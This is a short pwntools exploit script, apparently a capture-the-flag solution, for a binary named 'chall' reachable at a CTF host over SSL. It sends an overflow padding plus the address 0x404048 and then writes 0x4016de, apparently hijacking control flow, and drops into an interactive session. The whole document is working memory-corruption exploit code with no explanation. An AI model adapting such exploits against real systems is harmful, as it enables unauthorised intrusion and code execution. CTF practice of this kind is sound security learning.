#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main+288
                b*main+393
                b*main+510

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = process('ncat --ssl string-chan-78614178573fe3f7.chall.ctf.blackpinker.com 443'.split())
else:
    p = process(exe.path)

GDB()
sla(b"choice: ", b"3")
sla(b"str: ", b"a"*0x50)
pay = b"a"*32 + p64(0x404048)
sla(b"choice: ", b"1")
sla(b"c_str: ", pay)
# 0x4016de
sla(b"choice: ", b"3")
sla(b"str: ", p64(0x4016de))

p.interactive()
